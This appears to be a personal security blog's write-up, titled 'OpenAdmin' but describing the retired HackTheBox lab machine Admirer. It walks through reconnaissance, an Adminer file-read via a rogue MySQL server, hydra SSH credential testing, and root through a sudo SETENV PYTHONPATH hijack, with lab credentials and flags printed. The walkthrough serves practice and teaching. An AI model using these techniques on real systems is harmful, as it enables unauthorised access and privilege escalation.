@@ -1,0 +1,756 @@
+<!DOCTYPE html>
+<html class="no-js">
+<head>
+    <meta charset="utf-8">
+    <title>HTB: OpenAdmin | maggick's logs</title>
+
+    <meta name="author" content="maggick">
+    <meta name="description" content="">
+    <meta name="robots" content="">
+        <meta name="keywords" content="">
+        <meta property="og:title" content="">
+        <meta property="og:description" content="">
+        <meta property="og:url" content="">
+        <meta property="og:image" content="">
+    <meta property="og:site_name" content="maggick's logs">
+    <meta property="og:type" content="website">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+        <link rel="icon" type="image/x-icon" href="https://maggick.fr/media/favicon.ico">
+
+        <link href="feeds/all.atom.xml" rel="alternate" title="maggick's logs" type="application/atom+xml">
+
+    <link rel="canonical" href="">
+
+    <link rel="stylesheet" href="https://maggick.fr/theme/css/pure-min.css">
+    <link rel="stylesheet" href="https://maggick.fr/theme/css/main.css">
+</head>
+<body>
+<div id="page" class="full-entry">
+    <header class="pure-g-r header">
+        <div class="pure-u-1">
+            <div class="wrapper">
+                <div class="l-box">
+                    <a href="https://maggick.fr/index.html" title="Home page"
+                            class="logo">maggick's
+<span class="secondary">logs</span>                    </a>
+                </div>
+            </div>
+
+<nav class="pure-menu pure-menu-open pure-menu-horizontal menu">
+    <ul>
+            <li>
+              |
+            </li>
+                <li>
+                    <a href="https://maggick.fr/pages/about.html">About</a>
+                </li>
+                <li>
+                    <a href="https://maggick.fr/pages/notes.html">Notes</a>
+                </li>
+    </ul>
+</nav>        </div>
+    </header>
+
+    <div class="pure-g-r wrapper">
+        <section class="content pure-u-17-24">
+            <div class="l-box">
+
+<article class="entry">
+
+    <header class="entry-header">
+        <h1 class="entry-title">
+      <a href="https://maggick.fr/2020/09/htb-openadmin.html" title="Read more" class="entry-title-link">
+                HTB: OpenAdmin</a>
+        </h1>
+
+        <div class="entry-date">
+            <time datetime="2020-09-27T08:30:00+02:00">27 Sep 2020</time>
+        </div>
+
+    <div class="entry-meta">
+      <span class="meta entry-author">
+        <span class="icons icons-author"></span>
+        <a href="https://maggick.fr/author/maggick.html" title="Read more posts from maggick" class="meta-link">maggick</a>
+      </span>
+
+      <span class="meta entry-tags">
+        <span class="icons icons-category"></span>
+          <a href="https://maggick.fr/tag/security.html" title="Read more with the label security" class="meta-link">security</a> 
+          <a href="https://maggick.fr/tag/boot2root.html" title="Read more with the label boot2root" class="meta-link">boot2root</a> 
+          <a href="https://maggick.fr/tag/htb.html" title="Read more with the label HTB" class="meta-link">HTB</a> 
+          <a href="https://maggick.fr/tag/adminer.html" title="Read more with the label adminer" class="meta-link">adminer</a> 
+          <a href="https://maggick.fr/tag/linux.html" title="Read more with the label Linux" class="meta-link">Linux</a> 
+          <a href="https://maggick.fr/tag/sudo.html" title="Read more with the label sudo" class="meta-link">sudo</a> 
+      </span>
+              <span class="meta entry-tags">
+              <p style="text-align:right; color:#aaaaaa; ">&nbsp Estimated read time: 7 minutes</p></span>
+    </div>
+    </header>
+
+    <div class="entry-content">
+            <p><img class="align-left" src="/media/2020.09/admirer_card.png" alt="Admirer card" width="262"></p>
+<p>This is a writeup about a retired HacktheBox machine:
+<a href="https://www.hackthebox.eu/home/machines/profile/248">Admirer</a> created by
+<a href="https://www.hackthebox.eu/home/users/profile/159204">polarbearer</a> and
+<a href="https://www.hackthebox.eu/home/users/profile/125033">GibParadox</a> and publish on
+May 2, 2020.
+This box is classified as an easy machine. The user part implied a few
+enumeration and an adminer vulnerability.
+The root part implied a sudo permission with SETENV and a python script.</p>
+
+
+<h1 id="user">User</h1>
+<h2 id="recon">Recon</h2>
+<p>We start with an nmap scan. Only the ports 21(FTP), 22 (SSH) and 80 (HTTP) are open.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code># Nmap 7.80 scan initiated Mon May  4 11:30:21 2020 as: nmap -p- -sS -oN nmap 10.10.10.187</span>
+<span class="code-line">Nmap scan report for 10.10.10.187</span>
+<span class="code-line">Host is up (0.020s latency).</span>
+<span class="code-line">Not shown: 65532 closed ports</span>
+<span class="code-line">PORT   STATE SERVICE</span>
+<span class="code-line">21/tcp open  ftp</span>
+<span class="code-line">22/tcp open  ssh</span>
+<span class="code-line">80/tcp open  http</span>
+<span class="code-line"></span>
+<span class="code-line"># Nmap done at Mon May  4 11:39:02 2020 -- 1 IP address (1 host up) scanned in 520.65 seconds</span>
+<span class="code-line"></code></pre></div>
+
+
+<h2 id="ftp">FTP</h2>
+<p>The ftp service doesn't allow anonymous connections.</p>
+<h2 id="web">Web</h2>
+<p>The home web page is a collection of picture.</p>
+<p><img alt="Home page" src="/media/2020.09/admirer_01.png"></p>
+<p>We look at the <code>robot.txt</code> file, it contains the location of some <code>admin-dir</code>
+directory supposed to contain some credentials.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>User-agent: *</span>
+<span class="code-line"></span>
+<span class="code-line"># This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo</span>
+<span class="code-line">Disallow: /admin-dir</span>
+<span class="code-line"></code></pre></div>
+
+
+<p>We try a few filename like <code>passwords.txt</code>, <code>creds.txt</code>… <code>credentials.txt</code> works
+and give use a few usernames and password for some services including ftp.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>[Internal mail account]</span>
+<span class="code-line">w.cooper@admirer.htb</span>
+<span class="code-line">fgJr6q#S\W:$P</span>
+<span class="code-line"></span>
+<span class="code-line">[FTP account]</span>
+<span class="code-line">ftpuser</span>
+<span class="code-line">%n?4Wz}R$tTF7</span>
+<span class="code-line"></span>
+<span class="code-line">[Wordpress account]</span>
+<span class="code-line">admin</span>
+<span class="code-line">w0rdpr3ss01!</span>
+<span class="code-line"></code></pre></div>
+
+
+<h2 id="back-to-the-ftp">Back to the FTP</h2>
+<p>We connect to the FTP account using the creds. This allow us to get a SQL dump
+(nothing interesting in it) and an archive of the web site. This archive give
+show the existence of an interesting directory <code>utility-scripts</code>. It also give
+use credentials for a MySQL database in the <code>db_connect.php</code> file.
+The comment at the end of the file <code>// TODO: Finish implementing this or find a better open source alternative</code>
+is also an hint for the next part.</p>
+<p><img alt="FTP page" src="/media/2020.09/admirer_03.png"></p>
+<h2 id="back-to-the-web">Back to the web</h2>
+<p>We use <code>dirb</code> on the <code>utility-scripts</code> directory. As we know that the
+application is using php we add the <code>.php</code> extension. The tool discover the page
+<code>adminer.php</code>.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>kali@kali:~/pown/htb_admirer$ dirb http://10.10.10.187/utility-scripts/  /usr/share/wordlists/dirb/big.txt -X .php</span>
+<span class="code-line"></span>
+<span class="code-line">-----------------</span>
+<span class="code-line">DIRB v2.22</span>
+<span class="code-line">By The Dark Raver</span>
+<span class="code-line">-----------------</span>
+<span class="code-line"></span>
+<span class="code-line">START_TIME: Tue May  5 05:55:58 2020</span>
+<span class="code-line">URL_BASE: http://10.10.10.187/utility-scripts/</span>
+<span class="code-line">WORDLIST_FILES: /usr/share/wordlists/dirb/big.txt</span>
+<span class="code-line">EXTENSIONS_LIST: (.php) | (.php) [NUM = 1]</span>
+<span class="code-line"></span>
+<span class="code-line">-----------------</span>
+<span class="code-line"></span>
+<span class="code-line">GENERATED WORDS: 20458</span>
+<span class="code-line"></span>
+<span class="code-line">---- Scanning URL: http://10.10.10.187/utility-scripts/ ----</span>
+<span class="code-line">+ http://10.10.10.187/utility-scripts/adminer.php (CODE:200|SIZE:4295)</span>
+<span class="code-line"></code></pre></div>
+
+
+<h2 id="adminer">Adminer</h2>
+<p><a href="https://www.adminer.org/">Adminer</a> is a tools to manage your database directly
+from your browser. It is a <a href="https://www.phpmyadmin.net/">phpmyadmin</a>
+alternative.</p>
+<p>Obviously we land on a login page. The previously found credentials doesn't work.
+But looking at the page, we see that the used version is "4.6.2" and that the
+last version is "4.7.6".</p>
+<p><img alt="adminer page" src="/media/2020.09/admirer_02.png"></p>
+<p>We Google for "adminer 4.6.2 exploit" and found an article about a
+<a href="https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool">serious vulnerability in adminer tool</a></p>
+<p>We just need a <a href="https://github.com/allyshka/Rogue-MySql-Server">Rogue MySql Server</a>.
+We launch it and start getting some files. We try <code>db_connect.php</code> but the file
+was obviously replace by <code>adminer.php</code>. We can retrieve <code>adminier.php</code> just to
+be sure that our exploit is working. Then we just retrieve <code>../index.php</code> which
+contain the new creds for the database.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>kali@kali:~/Rogue-MySql-Server$ php roguemysql.php</span>
+<span class="code-line">Enter filename to get [db_connect.php] &gt; ../index.php</span>
+<span class="code-line">[.] Waiting for connection on 0.0.0.0:3306</span>
+<span class="code-line">[+] Connection from 10.10.10.187:47566 - greet... auth ok... some shit ok... want file...</span>
+<span class="code-line">[+] ../index.php from 10.10.10.187:47566:</span>
+<span class="code-line">&lt;!DOCTYPE HTML&gt;</span>
+<span class="code-line">&lt;!--</span>
+<span class="code-line">        Multiverse by HTML5 UP</span>
+<span class="code-line">        html5up.net | @ajlkn</span>
+<span class="code-line">        Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)</span>
+<span class="code-line">--&gt;</span>
+<span class="code-line">&lt;html&gt;</span>
+<span class="code-line">        &lt;head&gt;</span>
+<span class="code-line">                &lt;title&gt;Admirer&lt;/title&gt;</span>
+<span class="code-line">                &lt;meta charset=&quot;utf-8&quot; /&gt;</span>
+<span class="code-line">                &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, user-scalable=no&quot; /&gt;</span>
+<span class="code-line">                &lt;link rel=&quot;stylesheet&quot; href=&quot;assets/css/main.css&quot; /&gt;</span>
+<span class="code-line">                &lt;noscript&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;assets/css/noscript.css&quot; /&gt;&lt;/noscript&gt;</span>
+<span class="code-line">        &lt;/head&gt;</span>
+<span class="code-line">        &lt;body class=&quot;is-preload&quot;&gt;</span>
+<span class="code-line"></span>
+<span class="code-line">                &lt;!-- Wrapper --&gt;</span>
+<span class="code-line">                        &lt;div id=&quot;wrapper&quot;&gt;</span>
+<span class="code-line"></span>
+<span class="code-line">                                &lt;!-- Header --&gt;</span>
+<span class="code-line">                                        &lt;header id=&quot;header&quot;&gt;</span>
+<span class="code-line">                                                &lt;h1&gt;&lt;a href=&quot;index.html&quot;&gt;&lt;strong&gt;Admirer&lt;/strong&gt; of skills and visuals&lt;/a&gt;&lt;/h1&gt;</span>
+<span class="code-line">                                                &lt;nav&gt;</span>
+<span class="code-line">                                                        &lt;ul&gt;</span>
+<span class="code-line">                                                                &lt;li&gt;&lt;a href=&quot;#footer&quot; class=&quot;icon solid fa-info-circle&quot;&gt;About&lt;/a&gt;&lt;/li&gt;</span>
+<span class="code-line">                                                        &lt;/ul&gt;</span>
+<span class="code-line">                                                &lt;/nav&gt;</span>
+<span class="code-line">                                        &lt;/header&gt;</span>
+<span class="code-line"></span>
+<span class="code-line">                                &lt;!-- Main --&gt;</span>
+<span class="code-line">                                        &lt;div id=&quot;main&quot;&gt;</span>
+<span class="code-line">                                        &lt;?php</span>
+<span class="code-line">                        $servername = &quot;localhost&quot;;</span>
+<span class="code-line">                        $username = &quot;waldo&quot;;</span>
+<span class="code-line">                        $password = &quot;&amp;&lt;h5b~yK3F#{PaPB&amp;dA}{H&gt;&quot;;</span>
+<span class="code-line">                        $dbname = &quot;admirerdb&quot;;</span>
+<span class="code-line"></code></pre></div>
+
+
+<p>We can then connect to the local database with adminer but there is nothing
+interesting there.</p>
+<p>I have the habit to create two files <code>user</code> and <code>passwd</code> containing the looted
+data. We use <code>hydra</code> to test the gather creds against the ssh service. The last
+password found is a valid SSH password for the <code>waldo</code> user.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="err">$</span><span class="w"> </span><span class="n">hydra</span><span class="w"> </span><span class="o">-</span><span class="n">L</span><span class="w"> </span><span class="k">user</span><span class="w"> </span><span class="o">-</span><span class="n">P</span><span class="w"> </span><span class="n">passwd</span><span class="w"> </span><span class="nl">ssh</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.10.187</span><span class="w"></span></span>
+<span class="code-line"><span class="n">Hydra</span><span class="w"> </span><span class="n">v9</span><span class="mf">.0</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="p">)</span><span class="w"> </span><span class="mi">2019</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">van</span><span class="w"> </span><span class="n">Hauser</span><span class="o">/</span><span class="n">THC</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">Please</span><span class="w"> </span><span class="n">do</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="k">use</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">military</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="n">secret</span><span class="w"> </span><span class="n">service</span><span class="w"> </span><span class="n">organizations</span><span class="p">,</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">illegal</span><span class="w"> </span><span class="n">purposes</span><span class="p">.</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="n">Hydra</span><span class="w"> </span><span class="p">(</span><span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">vanhauser</span><span class="o">-</span><span class="n">thc</span><span class="o">/</span><span class="n">thc</span><span class="o">-</span><span class="n">hydra</span><span class="p">)</span><span class="w"> </span><span class="n">starting</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="mi">2020</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">05</span><span class="w"> </span><span class="mi">05</span><span class="err">:</span><span class="mi">22</span><span class="err">:</span><span class="mi">06</span><span class="w"></span></span>
+<span class="code-line"><span class="o">[</span><span class="n">WARNING</span><span class="o">]</span><span class="w"> </span><span class="n">Many</span><span class="w"> </span><span class="n">SSH</span><span class="w"> </span><span class="n">configurations</span><span class="w"> </span><span class="k">limit</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">number</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="n">parallel</span><span class="w"> </span><span class="n">tasks</span><span class="p">,</span><span class="w"> </span><span class="n">it</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">recommended</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">reduce</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="nl">tasks</span><span class="p">:</span><span class="w"> </span><span class="k">use</span><span class="w"> </span><span class="o">-</span><span class="n">t</span><span class="w"> </span><span class="mi">4</span><span class="w"></span></span>
+<span class="code-line"><span class="o">[</span><span class="n">DATA</span><span class="o">]</span><span class="w"> </span><span class="nf">max</span><span class="w"> </span><span class="mi">16</span><span class="w"> </span><span class="n">tasks</span><span class="w"> </span><span class="n">per</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">server</span><span class="p">,</span><span class="w"> </span><span class="n">overall</span><span class="w"> </span><span class="mi">16</span><span class="w"> </span><span class="n">tasks</span><span class="p">,</span><span class="w"> </span><span class="mi">66</span><span class="w"> </span><span class="n">login</span><span class="w"> </span><span class="n">tries</span><span class="w"> </span><span class="p">(</span><span class="nl">l</span><span class="p">:</span><span class="mi">11</span><span class="o">/</span><span class="nl">p</span><span class="p">:</span><span class="mi">6</span><span class="p">),</span><span class="w"> </span><span class="o">~</span><span class="mi">5</span><span class="w"> </span><span class="n">tries</span><span class="w"> </span><span class="n">per</span><span class="w"> </span><span class="n">task</span><span class="w"></span></span>
+<span class="code-line"><span class="o">[</span><span class="n">DATA</span><span class="o">]</span><span class="w"> </span><span class="n">attacking</span><span class="w"> </span><span class="nl">ssh</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.10.187</span><span class="err">:</span><span class="mi">22</span><span class="o">/</span><span class="w"></span></span>
+<span class="code-line"><span class="o">[</span><span class="n">22</span><span class="o">][</span><span class="n">ssh</span><span class="o">]</span><span class="w"> </span><span class="k">host</span><span class="err">:</span><span class="w"> </span><span class="mf">10.10.10.187</span><span class="w">   </span><span class="nl">login</span><span class="p">:</span><span class="w"> </span><span class="n">ftpuser</span><span class="w">   </span><span class="nl">password</span><span class="p">:</span><span class="w"> </span><span class="o">%</span><span class="n">n</span><span class="vm">?</span><span class="mi">4</span><span class="n">Wz</span><span class="err">}</span><span class="n">R</span><span class="err">$</span><span class="n">tTF7</span><span class="w"></span></span>
+<span class="code-line"><span class="o">[</span><span class="n">22</span><span class="o">][</span><span class="n">ssh</span><span class="o">]</span><span class="w"> </span><span class="k">host</span><span class="err">:</span><span class="w"> </span><span class="mf">10.10.10.187</span><span class="w">   </span><span class="nl">login</span><span class="p">:</span><span class="w"> </span><span class="n">waldo</span><span class="w">   </span><span class="nl">password</span><span class="p">:</span><span class="w"> </span><span class="o">&amp;&lt;</span><span class="n">h5b</span><span class="o">~</span><span class="n">yK3F</span><span class="err">#{</span><span class="n">PaPB</span><span class="o">&amp;</span><span class="n">dA</span><span class="err">}{</span><span class="n">H</span><span class="o">&gt;</span><span class="w"></span></span>
+<span class="code-line"><span class="mi">1</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">target</span><span class="w"> </span><span class="n">successfully</span><span class="w"> </span><span class="n">completed</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="n">valid</span><span class="w"> </span><span class="n">passwords</span><span class="w"> </span><span class="k">found</span><span class="w"></span></span>
+<span class="code-line"><span class="n">Hydra</span><span class="w"> </span><span class="p">(</span><span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">vanhauser</span><span class="o">-</span><span class="n">thc</span><span class="o">/</span><span class="n">thc</span><span class="o">-</span><span class="n">hydra</span><span class="p">)</span><span class="w"> </span><span class="n">finished</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="mi">2020</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">05</span><span class="w"> </span><span class="mi">05</span><span class="err">:</span><span class="mi">22</span><span class="err">:</span><span class="mi">17</span><span class="w"></span></span>
+<span class="code-line"></code></pre></div>
+
+
+<p>We can then connect to ssh and get the user flag.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>kali@kali:~/pown/htb_admirer/loot/html$ ssh waldo@10.10.10.187</span>
+<span class="code-line">waldo@10.10.10.187&#39;s password:</span>
+<span class="code-line">&lt;SNIP&gt;</span>
+<span class="code-line">waldo@admirer:~$ cat user.txt</span>
+<span class="code-line">fea0c3468144ce6091631cfbfb6c81eb</span>
+<span class="code-line"></code></pre></div>
+
+
+<h1 id="way-to-root">Way to root</h1>
+<p>With our ssh connection with start to enumerate the box. The first thing we
+notice is that we have the sudo permission to execute
+<code>/opt/scripts/admin_tasks.sh</code> with the <code>SETENV</code> flag. Which means that our
+environmental variable will be preserved.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>waldo@admirer:~$ sudo -l</span>
+<span class="code-line">[sudo] password for waldo:</span>
+<span class="code-line">Matching Defaults entries for waldo on admirer:</span>
+<span class="code-line">    env_reset, env_file=/etc/sudoenv, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, listpw=always</span>
+<span class="code-line"></span>
+<span class="code-line">User waldo may run the following commands on admirer:</span>
+<span class="code-line">    (ALL) SETENV: /opt/scripts/admin_tasks.sh</span>
+<span class="code-line"></code></pre></div>
+
+
+<p>When looking at the script we see a few interesting blocks.</p>
+<p>The first interesting part is the <code>backup_shadow</code> function. I tried some race
+condition between the moment the file is backuped and not yet <code>chown</code> to root.
+But that is not working.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>backup_shadow<span class="o">()</span></span>
+<span class="code-line"><span class="o">{</span></span>
+<span class="code-line">    <span class="k">if</span> <span class="o">[</span> <span class="s2">&quot;</span><span class="nv">$EUID</span><span class="s2">&quot;</span> -eq <span class="m">0</span> <span class="o">]</span></span>
+<span class="code-line">    <span class="k">then</span></span>
+<span class="code-line">        <span class="nb">echo</span> <span class="s2">&quot;Backing up /etc/shadow to /var/backups/shadow.bak...&quot;</span></span>
+<span class="code-line">        /bin/cp /etc/shadow /var/backups/shadow.bak</span>
+<span class="code-line">        /bin/chown root:shadow /var/backups/shadow.bak</span>
+<span class="code-line">        /bin/chmod <span class="m">600</span> /var/backups/shadow.bak</span>
+<span class="code-line">        <span class="nb">echo</span> <span class="s2">&quot;Done.&quot;</span></span>
+<span class="code-line">    <span class="k">else</span></span>
+<span class="code-line">        <span class="nb">echo</span> <span class="s2">&quot;Insufficient privileges to perform the selected operation.&quot;</span></span>
+<span class="code-line">    <span class="k">fi</span></span>
+<span class="code-line"><span class="o">}</span></span>
+<span class="code-line"></code></pre></div>
+
+
+<p>The next one is the <code>backup_web</code> function as this call an external python
+script.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>backup_web<span class="o">()</span></span>
+<span class="code-line"><span class="o">{</span></span>
+<span class="code-line">    <span class="k">if</span> <span class="o">[</span> <span class="s2">&quot;</span><span class="nv">$EUID</span><span class="s2">&quot;</span> -eq <span class="m">0</span> <span class="o">]</span></span>
+<span class="code-line">    <span class="k">then</span></span>
+<span class="code-line">        <span class="nb">echo</span> <span class="s2">&quot;Running backup script in the background, it might take a while...&quot;</span></span>
+<span class="code-line">        /opt/scripts/backup.py <span class="p">&amp;</span></span>
+<span class="code-line">    <span class="k">else</span></span>
+<span class="code-line">        <span class="nb">echo</span> <span class="s2">&quot;Insufficient privileges to perform the selected operation.&quot;</span></span>
+<span class="code-line">    <span class="k">fi</span></span>
+<span class="code-line"><span class="o">}</span></span>
+<span class="code-line"></code></pre></div>
+
+
+<p>The python script import the <code>make_archive</code> function from <code>shutil</code>. And then
+create a <code>tar.gz</code> archive from <code>/var/www/hml</code>.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="ch">#!/usr/bin/python3</span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="kn">from</span> <span class="nn">shutil</span> <span class="kn">import</span> <span class="n">make_archive</span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="n">src</span> <span class="o">=</span> <span class="s1">&#39;/var/www/html/&#39;</span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="c1"># old ftp directory, not used anymore</span></span>
+<span class="code-line"><span class="c1">#dst = &#39;/srv/ftp/html&#39;</span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="n">dst</span> <span class="o">=</span> <span class="s1">&#39;/var/backups/html&#39;</span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="n">make_archive</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="s1">&#39;gztar&#39;</span><span class="p">,</span> <span class="n">src</span><span class="p">)</span></span>
+<span class="code-line"></code></pre></div>
+
+
+<p>As we can export our environmental variable to <code>sudo</code>, we can rewrote the
+<code>shutil</code> module to execute the code we want. We wrote a specific <code>shutil.py</code> script:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="err">    :::python</span></span>
+<span class="code-line"><span class="err">    def make_archive(a,b,c):</span></span>
+<span class="code-line"><span class="err">        print(&#39;ok&#39;)</span></span>
+<span class="code-line"><span class="err">        with open(&#39;/root/root.txt&#39;) as f:</span></span>
+<span class="code-line"><span class="err">            with open(&#39;/tmp/plop/flag.txt&#39;, &#39;w&#39;) as g:</span></span>
+<span class="code-line"><span class="err">                g.write(f.read())</span></span>
+<span class="code-line"></code></pre></div>
+
+
+<p>And run the web backup with specifying our <code>PYTHONPATH</code> environment variable.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>waldo@admirer:/tmp/plop$ sudo PYTHONPATH=/tmp/plop /opt/scripts/admin_tasks.sh 6</span>
+<span class="code-line">Running backup script in the background, it might take a while...</span>
+<span class="code-line">waldo@admirer:/tmp/plop$ ok</span>
+<span class="code-line">cat flag.txt</span>
+<span class="code-line">6bd44137e00395497fefe44684913599</span>
+<span class="code-line"></code></pre></div>
+
+
+<h1 id="wrapping-up">Wrapping up</h1>
+<p>The box was a combination of simple techniques. As the exposed surface was
+really small (FTP, SSH and HTTP) there was not a lot of rabbit hole during
+exploration. I am a bit mad that the "exploit" for adminer was not in
+<code>searchsploit</code> as I lost some time before putting the search into Google.</p>
+<p>The root part was quit simple if you know already know the issue.</p>
+    </div>
+
+      <footer>
+          <div>
+            <b>Previous article:</b> <a href="https://maggick.fr/2020/04/hackpack-ctf-2020.html"> Hackpack CTF 2020 </a>
+          </div>
+          <div>
+            <b>Next article:</b> <a href="https://maggick.fr/2020/05/htb-obscurity.html"> HTB: Obscurity </a>
+          </div>
+
+<div class="social-buttons">
+
+
+</div>
+      </footer>
+
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = "matthieukeller";
+        var disqus_identifier = "2020/09/htb-openadmin.html";
+
+        (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+    <div class="clearfix"></div>
+
+</article>
+<!-- /.entry -->
+            </div>
+        </section>
+
+        <aside class="sidebar pure-u-7-24">
+            <div class="l-box">
+    <section class="module menuitems">
+        <h3 class="title module-title">Menu</h3>
+
+        <ul>
+                <li>
+                    <span class= "icons icons-archives"></span>
+                    <a href="/archives">archives</a>
+                </li>
+                <li>
+                    <span class= "icons icons-feeds"></span>
+                    <a href="/feeds/all.atom.xml">feeds</a>
+                </li>
+                <li>
+                    <span class= "icons icons-links"></span>
+                    <a href="/pages/links.html">links</a>
+                </li>
+        </ul>
+    </section>
+
+    <section class="module social">
+        <h3 class="title module-title">Social</h3>
+
+        <ul>
+                <li>
+                    <span class= "icons icons-github"></span>
+                    <a href="https://github.com/maggick">github</a>
+                </li>
+                <li>
+                    <span class= "icons icons-twitter"></span>
+                    <a href="https://twitter.com/maggick_fr">twitter</a>
+                </li>
+                <li>
+                    <span class= "icons icons-stackoverflow"></span>
+                    <a href="http://stackoverflow.com/users/1827067/maggick">stackoverflow</a>
+                </li>
+        </ul>
+    </section>
+
+
+<section class="module tagcloud">
+    <h3 class="title module-title">Tags</h3>
+
+    <ul>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/phs.html">PHS</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/postgresql.html">postgresql</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/bolt-cms.html">bolt CMS</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/devops.html">devops</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/sqli.html">SQLi</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/journalctl.html">journalctl</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/gogs.html">gogs</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/cygwin.html">cygwin</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/lets-encrypt.html">let's encrypt</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/ssl.html">SSL</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="https://maggick.fr/tag/suid.html">SUID</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/rop.html">ROP</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/ndh.html">ndh</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/docker.html">docker</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="https://maggick.fr/tag/security.html">security</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="https://maggick.fr/tag/windows.html">Windows</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/ret2libc.html">ret2libc</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/impacket.html">impacket</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="https://maggick.fr/tag/programming.html">programming</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="https://maggick.fr/tag/vulnhub.html">vulnhub</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/net.html">.NET</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/azure.html">Azure</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/procdump.html">procdump</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/cmus.html">cmus</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/code-review.html">code review</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/gitlab.html">gitlab</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/blog.html">blog</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/chrome.html">chrome</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/sudo.html">sudo</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/bypass.html">bypass</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/upload.html">Upload</a>
+            </li>
